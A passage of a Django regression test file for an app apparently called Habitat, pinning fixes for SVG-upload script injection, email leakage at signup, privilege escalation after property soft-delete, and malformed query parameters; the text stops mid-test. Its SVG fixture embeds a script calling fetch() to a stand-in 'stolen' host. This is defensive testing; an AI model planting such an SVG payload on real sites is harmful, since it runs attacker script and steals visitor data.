"""Regression tests for apps.accounts. Four unrelated defects are pinned
here, each in its own section; all are "this already regressed silently
once", which is this repo's bar for a checked-in test.

1. **Images** (D6, 2026-09-06) — what Habitat accepts as an image, and what
   it serves that image back as. Immediately below.
2. **Signup does not publish the user's email address** (D8, 2026-09-07) —
   see SignupDoesNotPublishTheEmailTests further down.
3. **Deleting a property does not widen anyone's access** (D10,
   2026-09-07) — see PropertyScopeSurvivesSoftDeleteTests further down.
4. **A malformed integer query parameter is refused, not a 500** (D14,
   2026-09-08) — see MalformedIntegerQueryParamsTests at the bottom. It
   lives here rather than in one of the four apps whose endpoints it
   covers, because the shared helper it exercises
   (apps/accounts/query_params.py) does.

--- 1. Images ---

These exist because of a specific defect (found 2026-09-06, fixed the same
day). All four upload endpoints validated the *client-supplied* multipart
`Content-Type` with `startswith("image/")`, and all eight serving paths
echoed the stored string back as the response `Content-Type`. So a caller
could upload `image/svg+xml` — SVG is not an inert raster format, it can
carry `<script>` — and the app would hand it back under that same type.
Loading such a file in an `<img>` never executes script, so the app's own
photo grids were fine; the vector was *navigating* to the photo URL, which
runs the author's script on the origin that served it. Since Habitat serves
app, API and public site from one origin by default, and the public photo
endpoints are `AllowAny` (a stable, shareable, unauthenticated URL), that
origin is the app's own.

Two properties are pinned here, and the second is the one most likely to be
mistaken for redundant:

1. **Upload rejects a scriptable type.** The allowlist is the fix.
2. **Serving never echoes a stored string.** A row written *before* the
   allowlist existed must not still be able to steer a response header —
   otherwise the fix would only protect databases that were already clean.
   `test_preexisting_svg_row_is_not_served_as_svg` constructs exactly such
   a row directly in the database (as the old code would have written it)
   and asserts the response is inert.

`test_nosniff_is_on` pins the other half of why an allowlist on the
*declared* type is sufficient without sniffing the bytes: uploading SVG
bytes under a declared `image/png` is served as `image/png`, and `nosniff`
stops the browser sniffing its way back to SVG. If that header ever goes
away, the allowlist alone is weaker than this module claims — so the test
explains itself rather than just going red.

Run with: python manage.py test apps.accounts
"""

import json
import threading
import time

from django.contrib.gis.geos import Point, Polygon
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import connection
from django.test import Client, SimpleTestCase, TestCase, TransactionTestCase
from django.test.utils import CaptureQueriesContext
from django.urls import reverse
from django.utils import timezone
from rest_framework.exceptions import PermissionDenied

from apps.accounts.images import (
    ALLOWED_IMAGE_TYPES,
    FALLBACK_CONTENT_TYPE,
    image_content_type,
    normalize_image_type,
    validate_image_upload,
)
from apps.accounts.models import (
    Invitation,
    Membership,
    Organization,
    Property,
    User,
)
from apps.accounts.org_scoping import (
    ensure_account_wide_admin,
    filter_by_property_scope,
    is_property_scoped,
    membership_manageable,
    scope_assignable,
    scoped_property_ids,
)
from apps.activities.models import Activity, ActivityPhoto, ActivityType, WorkflowState
from apps.sightings.models import Sighting, SightingPhoto
from apps.species.models import Species

SQUARE = Polygon(((0, 0), (0, 1), (1, 1), (1, 0), (0, 0)))

# A real, minimal SVG that would execute if a browser were allowed to treat
# it as one — this is the payload the fix exists to refuse.
SVG_BYTES = (
    b'<svg xmlns="http://www.w3.org/2000/svg"><script>'
    b"fetch('https://example.invalid/stolen')</script></svg>"
)
PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


class ImageTypeNormalizationTests(SimpleTestCase):
    """The pure helper, with no database — the allowlist's actual edges."""

    def test_scriptable_types_are_refused(self):
        for hostile in [
            "image/svg+xml",
            "image/svg",
            "text/html",
            "application/xhtml+xml",
            "application/javascript",
        ]:
            self.assertEqual(normalize_image_type(hostile), "", hostile)

    def test_allowed_types_pass_through(self):
        for allowed in ALLOWED_IMAGE_TYPES:
            self.assertEqual(normalize_image_type(allowed), allowed)

    def test_parameters_and_casing_do_not_smuggle_a_type_past_the_check(self):
        # A naive equality check against the raw header would reject these
        # legitimate uploads; a naive `startswith` would accept the SVG one.
        self.assertEqual(normalize_image_type("IMAGE/JPEG"), "image/jpeg")
        self.assertEqual(normalize_image_type("image/jpeg; charset=binary"), "image/jpeg")
        self.assertEqual(normalize_image_type("  image/png  "), "image/png")
        self.assertEqual(normalize_image_type("image/svg+xml; charset=utf-8"), "")

    def test_prefix_lookalikes_are_refused(self):
        """`startswith("image/")` — the old check — accepted all of these."""
        for lookalike in ["image/svg+xml", "image/anything", "image/"]:
            self.assertEqual(normalize_image_type(lookalike), "", lookalike)

    def test_jpg_alias_resolves_to_jpeg(self):
        self.assertEqual(normalize_image_type("image/jpg"), "image/jpeg")

    def test_empty_and_missing_values_are_refused(self):
        for empty in ["", None, "   "]:
            self.assertEqual(normalize_image_type(empty), "")

    def test_validate_image_upload_reads_the_declared_type(self):
        good = SimpleUploadedFile("a.png", PNG_BYTES, content_type="image/png")
        bad = SimpleUploadedFile("a.svg", SVG_BYTES, content_type="image/svg+xml")
        self.assertEqual(validate_image_upload(good), "image/png")
        self.assertEqual(validate_image_upload(bad), "")

    def test_serving_never_returns_an_unallowlisted_stored_value(self):
        """The backfill-proof half, at the unit level."""
        self.assertEqual(image_content_type("image/png"), "image/png")
        self.assertEqual(image_content_type("image/svg+xml"), FALLBACK_CONTENT_TYPE)
        self.assertEqual(image_content_type("text/html"), FALLBACK_CONTENT_TYPE)
        self.assertEqual(image_content_type(""), FALLBACK_CONTENT_TYPE)


class ImageUploadEndpointTests(TestCase):
    """The four upload endpoints must all refuse a scriptable type, and all
    still accept an ordinary photo."""

    def setUp(self):
        self.org = Organization.objects.create(name="Test Org")
        self.user = User.objects.create_user(email="e@example.com", password="pw-12345678")
        Membership.objects.create(
            organization=self.org, user=self.user, role=Membership.Role.ADMIN
        )
        self.property = Property.objects.create(
            organization=self.org, name="P", boundary=SQUARE, is_public=True
        )
        status = WorkflowState.objects.filter(organization=self.org).first()
        activity_type = ActivityType.objects.filter(organization=self.org).first()
        self.activity = Activity.objects.create(
            organization=self.org,
            property=self.property,
            activity_type=activity_type,
            status=status,
            geometry=SQUARE,
            is_public=True,
        )
        species = Species.objects.create(
            organization=self.org, common_name="Common Milkweed"
        )
        self.sighting = Sighting.objects.create(
            organization=self.org,
            property=self.property,
            species=species,
            location=Point(0.5, 0.5),
            observed_at=timezone.now(),
            is_public=True,
        )
        self.client.force_login(self.user)

    def _upload(self, url, content_type, name="f"):
        payload = SVG_BYTES if "svg" in content_type else PNG_BYTES
        return self.client.post(
            url,
            {"image": SimpleUploadedFile(name, payload, content_type=content_type)},
        )

    def _urls(self):
        return [
            reverse("activity-photos", args=[self.activity.id]),
            reverse("sighting-photos", args=[self.sighting.id]),
            reverse("org-theme-image"),
            reverse("property-theme-image", args=[self.property.id]),
        ]

    def test_every_upload_endpoint_refuses_svg(self):
        for url in self._urls():
            response = self._upload(url, "image/svg+xml", name="x.svg")
            self.assertEqual(response.status_code, 400, url)

    def test_every_upload_endpoint_still_accepts_a_png(self):
        """The guard against a fix that simply breaks uploads."""
        for url in self._urls():
            response = self._upload(url, "image/png", name="x.png")
            self.assertIn(response.status_code, (200, 201), f"{url} -> {response.status_code}")

    def test_stored_type_is_the_normalized_value_not_the_clients_string(self):
        self._upload(reverse("activity-photos", args=[self.activity.id]), "image/jpg")
        self.assertEqual(ActivityPhoto.objects.get().content_type, "image/jpeg")


class ImageServingTests(TestCase):
    """A row that predates the allowlist must still be served inert."""

    def setUp(self):
        self.org = Organization.objects.create(name="Test Org")
        self.user = User.objects.create_user(email="e@example.com", password="pw-12345678")
        Membership.objects.create(
            organization=self.org, user=self.user, role=Membership.Role.ADMIN
        )
        self.property = Property.objects.create(
            organization=self.org, name="P", boundary=SQUARE, is_public=True
        )
        status = WorkflowState.objects.filter(organization=self.org).first()
        activity_type = ActivityType.objects.filter(organization=self.org).first()
        self.activity = Activity.objects.create(
            organization=self.org,
            property=self.property,
            activity_type=activity_type,
            status=status,
            geometry=SQUARE,
            is_public=True,
        )
        species = Species.objects.create(
            organization=self.org, common_name="Common Milkweed"
        )
        self.sighting = Sighting.objects.create(
            organization=self.org,
            property=self.property,
            species=species,
            location=Point(0.5, 0.5),
            observed_at=timezone.now(),
            is_public=True,
        )
        # Written exactly as the pre-fix upload path would have written it.
        self.activity_photo = ActivityPhoto.objects.create(
            activity=self.activity, image=SVG_BYTES, content_type="image/svg+xml"
        )
        self.sighting_photo = SightingPhoto.objects.create(
            sighting=self.sighting, image=SVG_BYTES, content_type="image/svg+xml"
        )
        self.org.theme_header_image = SVG_BYTES
        self.org.theme_header_image_content_type = "image/svg+xml"
        self.org.save()
        self.property.theme_header_image = SVG_BYTES
        self.property.theme_header_image_content_type = "image/svg+xml"
        self.property.save()

    def _public_urls(self):
        return [
            reverse(
                "public-activity-photo-image",
                args=[self.activity.id, self.activity_photo.id],
            ),
            reverse(
                "public-sighting-photo-image",
                args=[self.sighting.id, self.sighting_photo.id],
            ),
            reverse("public-organization-theme-image", args=[self.org.id]),
            reverse("public-property-theme-image", args=[self.property.id]),
        ]

    def test_preexisting_svg_row_is_not_served_as_svg_anonymously(self):
        """The `AllowAny` paths — the shareable URLs, and the ones that
        matter most."""
        for url in self._public_urls():
            response = self.client.get(url)
            self.assertEqual(response.status_code, 200, url)
            self.assertEqual(response["Content-Type"], FALLBACK_CONTENT_TYPE, url)

    def test_preexisting_svg_row_is_not_served_as_svg_when_authenticated(self):
        self.client.force_login(self.user)
        for url in [
            reverse(
                "activity-photo-image", args=[self.activity.id, self.activity_photo.id]
            ),
            reverse(
                "sighting-photo-image", args=[self.sighting.id, self.sighting_photo.id]
            ),
            reverse("org-theme-image"),
            reverse("property-theme-image", args=[self.property.id]),
        ]:
            response = self.client.get(url)
            self.assertEqual(response.status_code, 200, url)
            self.assertEqual(response["Content-Type"], FALLBACK_CONTENT_TYPE, url)

    def test_the_bytes_are_still_served_unchanged(self):
        """Only the declared type is corrected — the fix does not silently
        corrupt or drop stored image data."""
        response = self.client.get(self._public_urls()[0])
        self.assertEqual(response.content, SVG_BYTES)

    def test_an_ordinary_photo_keeps_its_real_type(self):
        photo = ActivityPhoto.objects.create(
            activity=self.activity, image=PNG_BYTES, content_type="image/png"
        )
        response = self.client.get(
            reverse("public-activity-photo-image", args=[self.activity.id, photo.id])
        )
        self.assertEqual(response["Content-Type"], "image/png")

    def test_nosniff_is_on(self):
        """Why allowlisting the declared type is enough without sniffing the
        bytes: SVG bytes uploaded as `image/png` are served as `image/png`,
        and this header stops the browser sniffing back to SVG."""
        response = self.client.get(self._public_urls()[0])
        self.assertEqual(response.headers.get("X-Content-Type-Options"), "nosniff")


# --- 2. Signup does not publish the user's email address (D8) ---

# A distinctive local part, so the substring assertions below are meaningful
# rather than accidentally matching boilerplate. The pre-fix code named the
# org "<this address>'s land", which slugify() turns into
# "d8canaryexampleinvalids-land" — hence checking for the punctuation-stripped
# forms too, not just the address as typed.
CANARY_EMAIL = "d8canary@example.invalid"
CANARY_LOCAL_PART = "d8canary"
CANARY_SQUASHED = "d8canaryexampleinvalid"


class SignupDoesNotPublishTheEmailTests(TestCase):
    """A signup that leaves the optional account name blank must not put the
    signing-up user's email address on the public site.

    The defect (D8, found and fixed 2026-09-07): signup named a nameless org
    `f"{email}'s land"`, and `Organization.save()` slugifies `name` into the
    public vanity URL. `apps/public_site/views.py#organization_detail` has no
    visibility gate at all — no `is_public`, no membership check, no "has
    this org published anything" condition — so both the name and the slug
    were served to anonymous callers at a stable URL. A user who signed up,
    left one optional field blank and published *nothing* still had their
    email address exposed, in two fields, on two routes.

    What these tests deliberately do **not** assert: that an organization is
    hidden when it has published nothing. Whether `Organization` should gain
    an `is_public` gate mirroring `Property`'s is an open question for the
    owner (D8's Q2 — either default has a real cost), as is whether existing
    email-derived rows get backfilled (Q1 — a rename alone does not change
    an already-shared public URL, see `Organization.save()`). Those stay
    open; this module pins only the half that needed no decision.

    So `test_the_public_page_is_still_served` below is not an oversight — it
    records that closing Q2 is a *deliberate* omission, so a future reader
    can't mistake these passing tests for "the org page is gated now".
    """

    def _signup(self, **extra):
        return self.client.post(
            "/api/auth/signup/",
            {"email": CANARY_EMAIL, "password": "a-perfectly-fine-passphrase", **extra},
            content_type="application/json",
        )

    def _public_bodies(self, organization):
        """The org's public payload over both routes D8 named — the numeric
        one and the vanity slug. Anonymous: no login is performed here."""
        return [
            self.client.get(
                reverse("public-organization", args=[organization.id])
            ).content.decode(),
            self.client.get(
                reverse("public-organization-slug", args=[organization.slug])
            ).content.decode(),
        ]

    def test_a_blank_account_name_is_not_derived_from_the_email(self):
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        self.assertEqual(organization.name, Organization.DEFAULT_NAME)
        self.assertNotIn(CANARY_LOCAL_PART, organization.name.lower())

    def test_a_blank_account_name_does_not_leak_the_email_into_the_public_slug(self):
        """The slug is the half most easily missed: it is generated from
        `name`, so fixing the name without checking the slug would look
        right and still publish the address with its punctuation stripped."""
        self.assertEqual(self._signup().status_code, 201)
        slug = Organization.objects.get().slug
        self.assertTrue(slug)
        self.assertNotIn(CANARY_LOCAL_PART, slug)
        self.assertNotIn(CANARY_SQUASHED, slug)

    def test_the_anonymous_public_payload_contains_no_part_of_the_email(self):
        """The end-to-end property, over the exact unauthenticated routes the
        finding named. Asserted against the whole response body rather than
        one field, so a future serializer that adds another email-derived
        field fails here too."""
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        for body in self._public_bodies(organization):
            self.assertNotIn(CANARY_EMAIL, body)
            self.assertNotIn(CANARY_LOCAL_PART, body)
            self.assertNotIn(CANARY_SQUASHED, body)
            self.assertNotIn("@", body)

    def test_the_public_page_is_still_served(self):
        """Pins D8's Q2 as *open*, not closed. An organization that has
        published nothing is still readable by anyone — that is unchanged and
        deliberate, and it is the owner's call to change. If this test starts
        failing, someone answered Q2; update this module rather than
        'repairing' the assertion."""
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        response = self.client.get(reverse("public-organization", args=[organization.id]))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()["organization"]["name"], Organization.DEFAULT_NAME)

    def test_a_supplied_account_name_is_used_verbatim(self):
        """The normal path is untouched — this guards against a fix that
        stops honouring the field at all."""
        self.assertEqual(self._signup(organization_name="Mira Canyon Trust").status_code, 201)
        organization = Organization.objects.get()
        self.assertEqual(organization.name, "Mira Canyon Trust")
        self.assertEqual(organization.slug, "mira-canyon-trust")

    def test_a_whitespace_only_account_name_is_treated_as_blank(self):
        """`signup` strips the field, so "   " must take the default rather
        than creating an unnamed org whose slug falls back to `"org"`."""
        self.assertEqual(self._signup(organization_name="   ").status_code, 201)
        self.assertEqual(Organization.objects.get().name, Organization.DEFAULT_NAME)

    def test_two_blank_name_signups_get_distinct_slugs(self):
        """The default name collides by construction, where the email-derived
        one never did — so uniqueness is a new load-bearing property of this
        change, not a pre-existing one."""
        self.assertEqual(self._signup().status_code, 201)
        self.client.post("/api/auth/logout/")
        second = self.client.post(
            "/api/auth/signup/",
            {"email": "d8canary-two@example.invalid", "password": "a-perfectly-fine-passphrase"},
            content_type="application/json",
        )
        self.assertEqual(second.status_code, 201)

        slugs = list(Organization.objects.order_by("id").values_list("slug", flat=True))
        self.assertEqual(len(slugs), 2)
        self.assertEqual(len(set(slugs)), 2, f"slugs collided: {slugs}")
        for slug in slugs:
            self.assertNotIn("d8canary", slug)


# --- 3. Deleting a property does not widen anyone's access (D10) ---
#
# These exist because of a specific defect (D10, found and fixed
# 2026-09-07). `org_scoping.scoped_property_ids` read a membership's scope
# through `membership.properties` — a related manager, which inherits the
# *related* model's default manager. Property's default manager hides
# soft-deleted rows. So once every property a membership was scoped to had
# been deleted, the scope came back empty, and empty is the encoding this
# whole module uses for "account-wide access to the entire organization".
#
# The trigger is not an attack; it is the ordinary, supported "Delete
# property" button. A property-scoped *admin* whose one property was
# deleted silently became a full account-wide admin: able to rename the
# organization, take over its public URL slug, and manage the org's real
# account-wide admins. A scoped viewer or editor gained read/write over
# every other property in the org.
#
# The fix reads the scope through Property.all_objects, so a membership
# with scope rows stays scoped whatever happened to the properties behind
# them. Least privilege falls out of that: the deleted property is still
# excluded from data on the way out, so such a member sees nothing rather
# than everything, and gets exactly its old access back on restore.
#
# `test_the_related_manager_still_hides_a_soft_deleted_property` pins the
# Django semantic the whole defect rests on, in the same spirit as
# apps/public_site/tests.py's join-filter test: if that behaviour ever
# changes, it explains *why* the rest of these assertions exist rather
# than just going red.


class PropertyScopeSurvivesSoftDeleteTests(TestCase):
    """Soft-deleting a property must never widen a scoped membership."""

    def setUp(self):
        self.org = Organization.objects.create(name="Scope Org")
        self.scoped_property = Property.objects.create(
            organization=self.org, name="Their Field", boundary=SQUARE
        )
        self.other_property = Property.objects.create(
            organization=self.org, name="Not Theirs", boundary=SQUARE
        )
        self.scoped_user = User.objects.create_user(
            email="scoped@example.com", password="pw-for-tests-1"
        )
        self.scoped = Membership.objects.create(
            user=self.scoped_user, organization=self.org, role=Membership.Role.ADMIN
        )
        self.scoped.properties.add(self.scoped_property)

        self.wide_user = User.objects.create_user(
            email="wide@example.com", password="pw-for-tests-2"
        )
        self.wide = Membership.objects.create(
            user=self.wide_user, organization=self.org, role=Membership.Role.ADMIN
        )

    def _delete_the_scoped_property(self):
        self.scoped_property.deleted_at = timezone.now()
        self.scoped_property.save(update_fields=["deleted_at"])
        # Re-read so nothing passes on a stale cached relation.
        self.scoped = Membership.objects.get(pk=self.scoped.pk)

    def _restore_the_scoped_property(self):
        self.scoped_property.deleted_at = None
        self.scoped_property.save(update_fields=["deleted_at"])
        self.scoped = Membership.objects.get(pk=self.scoped.pk)

    # --- the semantic the defect rested on -------------------------------

    def test_the_related_manager_still_hides_a_soft_deleted_property(self):
        """Not asserting the fix — asserting the trap it works around.

        A related manager uses the related model's *default* manager, so a
        soft-deleted property vanishes from `membership.properties` while
        its row in the join table is untouched. Every assertion below
        exists because that is true.
        """
        self._delete_the_scoped_property()

        self.assertEqual(list(self.scoped.properties.all()), [])
        self.assertEqual(
            self.scoped.properties(manager="all_objects").count(),
            1,
            "the scope row itself must still be there — only the default "
            "manager's filter should be hiding it",
        )

    # --- the escalation itself -------------------------------------------

    def test_a_scoped_membership_stays_scoped(self):
        self.assertTrue(is_property_scoped(self.scoped))

        self._delete_the_scoped_property()

        self.assertTrue(
            is_property_scoped(self.scoped),
            "deleting the property a member is scoped to must not turn that "
            "member into an account-wide one",
        )
        self.assertEqual(scoped_property_ids(self.scoped), {self.scoped_property.id})

    def test_a_scoped_admin_does_not_gain_organization_level_powers(self):
        """The severe case: rename the org, take its public URL, retheme it."""
        with self.assertRaises(PermissionDenied):
            ensure_account_wide_admin(self.scoped)

        self._delete_the_scoped_property()

        with self.assertRaises(PermissionDenied):
            ensure_account_wide_admin(self.scoped)

    def test_a_scoped_admin_cannot_reach_the_organizations_real_admins(self):
        self.assertFalse(membership_manageable(self.scoped, self.wide))

        self._delete_the_scoped_property()

        self.assertFalse(
            membership_manageable(self.scoped, self.wide),
            "a property-scoped admin must never be able to act on an "
            "account-wide admin, deleted properties or not",
        )

    def test_a_scoped_admin_cannot_start_handing_out_account_wide_access(self):
        self.assertFalse(scope_assignable(self.scoped, []))

        self._delete_the_scoped_property()

        self.assertFalse(scope_assignable(self.scoped, []))
        self.assertFalse(
            scope_assignable(self.scoped, [self.other_property.id]),
            "still cannot grant access to a property outside its own scope",
        )

    def test_no_other_property_becomes_visible(self):
        """Least privilege, stated as data rather than as a flag.

        The member should see *nothing* — not the deleted property (it is
        gone) and emphatically not the org's other property.
        """
        self._delete_the_scoped_property()

        visible = filter_by_property_scope(
            Property.objects.filter(organization=self.org),
            self.scoped,
            property_field="id",
        )

        self.assertEqual(list(visible), [])

    def test_access_comes_back_unchanged_on_restore(self):
        """The window is 30 days and restore is a supported action, so the
        fix has to be reversible, not just safe."""
        self._delete_the_scoped_property()
        self._restore_the_scoped_property()

        visible = filter_by_property_scope(
            Property.objects.filter(organization=self.org),
            self.scoped,
            property_field="id",
        )

        self.assertEqual([p.name for p in visible], ["Their Field"])
        self.assertTrue(is_property_scoped(self.scoped))

    # --- the same bug, reached through the invitation flow ---------------

    def test_an_invitation_scoped_to_a_deleted_property_does_not_grant_the_org(self):
        """An invitation carries the scope its membership will be created
        with. Copying it through the filtered manager dropped a deleted
        property and produced an *account-wide* member — a second, quieter
        route to the same escalation, and the reason the accept path was
        fixed alongside the helper."""
        invitation = Invitation.objects.create(
            organization=self.org,
            email="invitee@example.com",
            role=Membership.Role.EDITOR,
            invited_by=self.wide_user,
        )
        invitation.properties.add(self.scoped_property)
        self._delete_the_scoped_property()

        response = self.client.post(
            f"/api/invitations/{invitation.token}/accept/",
            {"password": "a-strong-password-for-tests", "first_name": "Test"},
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 201)
        membership = Membership.objects.get(user__email="invitee@example.com")
        self.assertTrue(
            is_property_scoped(membership),
            "accepting an invitation whose property was deleted in the "
            "meantime must not produce an account-wide member",
        )
        self.assertEqual(scoped_property_ids(membership), {self.scoped_property.id})

    # --- the second definition of "account-wide", in the lockout guard ---

    def test_the_session_payload_reports_the_member_as_scoped(self):
        """The frontend hides "+ New property" on this field. If it reads
        empty, the UI offers actions the API then refuses."""
        self._delete_the_scoped_property()
        self.client.force_login(self.scoped_user)

        response = self.client.get("/api/auth/me/")

        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            response.json()["membership"]["properties"],
            [self.scoped_property.id],
        )

    def test_a_scoped_admin_can_still_be_demoted(self):
        """The mirror-image symptom, and why one shared definition matters.

        The lockout guard asked `membership.properties.exists()` while
        `_account_wide_admin_count` asked it with a join (which bypasses
        the manager, so it was right). Once the two disagreed, the guard
        treated this scoped admin as the org's last account-wide one and
        refused to let anybody change it.
        """
        self._delete_the_scoped_property()
        self.client.force_login(self.wide_user)

        response = self.client.patch(
            f"/api/org/members/{self.scoped.id}/",
            {"role": Membership.Role.VIEWER},
            content_type="application/json",
        )

        self.assertEqual(
            response.status_code,
            200,
            f"the org's real account-wide admin must still be able to demote "
            f"a property-scoped admin: {response.content!r}",
        )
        self.scoped.refresh_from_db()
        self.assertEqual(self.scoped.role, Membership.Role.VIEWER)

    def test_the_last_real_account_wide_admin_is_still_protected(self):
        """The guard must not have been loosened into uselessness by the
        fix — this is the case it genuinely exists for."""
        self.client.force_login(self.wide_user)

        response = self.client.patch(
            f"/api/org/members/{self.wide.id}/",
            {"role": Membership.Role.VIEWER},
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 400)
        self.wide.refresh_from_db()
        self.assertEqual(self.wide.role, Membership.Role.ADMIN)

    # --- the whole thing through the real endpoints ----------------------

    def test_a_scoped_admin_cannot_escalate_itself_by_deleting_its_property(self):
        """The sharpest statement of the defect: it is self-service.

        Deleting a property is an ordinary admin action, and a
        property-scoped admin is authorised to do it to its *own*
        property. Before the fix that single, supported button turned the
        caller into an account-wide admin — no second actor, no race, no
        waiting. This drives it through the real HTTP endpoints rather
        than the helpers, because that is the form the escalation
        actually took.
        """
        self.client.force_login(self.scoped_user)

        deleted = self.client.delete(f"/api/properties/{self.scoped_property.id}/")
        self.assertIn(deleted.status_code, (204, 200))

        # 1. The organization is not theirs to rename.
        renamed = self.client.patch(
            "/api/org/",
            {"name": "Taken Over"},
            content_type="application/json",
        )
        self.assertEqual(
            renamed.status_code,
            403,
            "a property-scoped admin must not be able to rename the "
            "organization after deleting its own property",
        )
        self.org.refresh_from_db()
        self.assertEqual(self.org.name, "Scope Org")

        # 2. The org's real account-wide admin is still out of reach.
        removed = self.client.delete(f"/api/org/members/{self.wide.id}/")
        self.assertIn(removed.status_code, (403, 404))
        self.assertTrue(Membership.objects.filter(pk=self.wide.pk).exists())

        # 3. And no new data came into view.
        listed = self.client.get("/api/properties/")
        self.assertEqual(listed.status_code, 200)
        body = listed.json()
        features = body["features"] if isinstance(body, dict) else body
        self.assertEqual(
            [f["properties"]["name"] for f in features],
            [],
            "the org's other property must not have become visible",
        )

    def test_the_member_list_agrees_with_what_the_detail_endpoints_allow(self):
        """The list and the per-member endpoints must answer one question.

        The list re-derived the containment test instead of asking
        `membership_manageable`, and read the scope through the filtered
        manager while doing it — so a member scoped to a soft-deleted
        property disappeared from the list while remaining editable by id.
        A row you can change but cannot see is the same class of mistake
        as D10 itself: one scope question, two answers.
        """
        colleague_user = User.objects.create_user(
            email="colleague@example.com", password="pw-for-tests-3"
        )
        colleague = Membership.objects.create(
            user=colleague_user, organization=self.org, role=Membership.Role.EDITOR
        )
        colleague.properties.add(self.scoped_property)
        self._delete_the_scoped_property()
        self.client.force_login(self.scoped_user)

        listed = self.client.get("/api/org/members/")
        self.assertEqual(listed.status_code, 200)
        listed_ids = {row["id"] for row in listed.json()}

        patched = self.client.patch(
            f"/api/org/members/{colleague.id}/",
            {"role": Membership.Role.VIEWER},
            content_type="application/json",
        )

        self.assertIn(
            colleague.id,
            listed_ids,
            "a member this admin can still edit must not vanish from its list",
        )
        self.assertEqual(patched.status_code, 200)
        # And the account-wide admin stays both invisible and untouchable.
        self.assertNotIn(self.wide.id, listed_ids)

    def test_the_scope_read_survives_a_prefetch(self):
        """The subtlest part of the fix, and the one most likely to be
        "simplified" back into a bug.

        `properties(manager="all_objects")` returns the right rows — until
        a caller adds `prefetch_related("properties")`, at which point the
        prefetch (populated through the *default* manager, so already
        missing the soft-deleted rows) satisfies the call from its cache
        and the escape hatch silently stops escaping. The org admin
        console's member list prefetches exactly that, which is how this
        was caught. Reading the join table directly is what makes the
        result independent of how the caller fetched its rows.
        """
        self._delete_the_scoped_property()

        plain = Membership.objects.get(pk=self.scoped.pk)
        prefetched = Membership.objects.filter(pk=self.scoped.pk).prefetch_related(
            "properties"
        )[0]

        self.assertEqual(scoped_property_ids(plain), {self.scoped_property.id})
        self.assertEqual(
            scoped_property_ids(prefetched),
            {self.scoped_property.id},
            "a prefetch must not be able to make a scoped membership look "
            "account-wide",
        )
        self.assertTrue(is_property_scoped(prefetched))


# --- 4. Malformed integer query parameters (D14, 2026-09-08) ---
#
# See the module docstring above; this is the fourth unrelated defect pinned
# in this file. It lives in apps/accounts because the shared helper it tests
# does (apps/accounts/query_params.py) and because the defect spanned four
# endpoints in four different apps, so no single app's module owns it.


class MalformedIntegerQueryParamsTests(TestCase):
    """A non-numeric `?property=` / `?assigned_to=` used to be an unhandled
    500 (D14, found and fixed 2026-09-08).

    The four list endpoints below took an id straight from the query string
    and dropped it into a queryset, so the string reached the database
    driver, which raised `ValueError` converting it to an integer. Nothing
    turned that into a response — DRF's `exception_handler` returns `None`
    for it — so it surfaced as a 500.

    **This is not an exotic request shape: the app itself sent one.**
    `/properties/abc` is a real frontend route, `PropertyMapPage` did
    `Number(id)` with no guard, and the API client's `withQuery` skips only
    `undefined` — so `String(NaN)` went on the wire as the literal `NaN`,
    and one mistyped property URL produced three 500s.

    Severity is deliberately not overstated: every endpoint here is
    session-authenticated and a *valid* id belonging to another org already
    returns nothing correctly, so this is 500-hygiene and a bad error
    message, not a data-exposure or cross-tenant defect.

    Three of these tests pass against the pre-fix code by design, and each
    says so in its own docstring — they guard against a "fix" that breaks
    what the parameter is actually for, rather than asserting the fix.
    """

    def setUp(self):
        self.org = Organization.objects.create(name="Test Org")
        self.user = User.objects.create_user(
            email="member@example.com", password="pw-12345678"
        )
        Membership.objects.create(
            organization=self.org, user=self.user, role=Membership.Role.ADMIN
        )
        self.property = Property.objects.create(
            organization=self.org,
            name="Test Property",
            boundary=Polygon(((0, 0), (0, 1), (1, 1), (1, 0), (0, 0))),
        )
        self.client.force_login(self.user)

    # The exact value the frontend used to send on a mistyped URL, plus two
    # other shapes a stale link or a hand-edited address bar produces.
    BAD_VALUES = ["NaN", "abc", "1.5"]

    def test_activities_rejects_a_non_numeric_property(self):
        """The first of D14's three 500s."""
        for bad in self.BAD_VALUES:
            with self.subTest(value=bad):
                response = self.client.get(f"/api/activities/?property={bad}")
                self.assertEqual(
                    response.status_code,
                    400,
                    f"?property={bad} must be refused, not 500",
                )

    def test_sightings_rejects_a_non_numeric_property(self):
        """The second."""
        for bad in self.BAD_VALUES:
            with self.subTest(value=bad):
                response = self.client.get(f"/api/sightings/?property={bad}")
                self.assertEqual(response.status_code, 400)

    def test_pages_rejects_a_non_numeric_property(self):
        """The third — and the one that answers a 404 rather than a 400.

        This call site *resolves* `?property=` to a real Property and
        already 404s when the id belongs to another organization, so a
        malformed id is "no such property" there. The rule is to match what
        a valid-but-nonexistent id already does at that call site; see
        apps/accounts/query_params.py.
        """
        for bad in self.BAD_VALUES:
            with self.subTest(value=bad):
                response = self.client.get(f"/api/pages/?property={bad}")
                self.assertEqual(response.status_code, 404)

    def test_tasks_rejects_a_non_numeric_assigned_to(self):
        """The fourth call site. Not reachable from the current UI, which
        never puts a route id in this parameter — but it is the same
        unparsed-id-into-a-queryset shape, and was fixed with the rest so
        the pattern doesn't survive in one place."""
        for bad in self.BAD_VALUES:
            with self.subTest(value=bad):
                response = self.client.get(f"/api/tasks/?assigned_to={bad}")
                self.assertEqual(response.status_code, 400)

    def test_a_valid_id_that_matches_nothing_is_still_a_200(self):
        """Passes both before and after the fix, deliberately.

        This is the guard against "fixing" the 500 by making the endpoints
        strict about *existence*. A filter narrows a collection; a valid id
        matching no rows is an empty list, not an error. It is also why
        these three call sites answer 400 rather than 404.
        """
        cases = [
            ("/api/activities/", "property", "features"),
            ("/api/sightings/", "property", "features"),
            ("/api/tasks/", "assigned_to", None),
        ]
        for path, param, geo_key in cases:
            with self.subTest(path=path):
                response = self.client.get(f"{path}?{param}=999999")
                self.assertEqual(response.status_code, 200)
                body = response.json()
                # The two geo endpoints serialize as a GeoJSON
                # FeatureCollection; tasks is a plain list.
                rows = body[geo_key] if geo_key else body
                self.assertEqual(rows, [], "a valid id matching nothing is an empty result")

    def test_the_property_filter_still_filters(self):
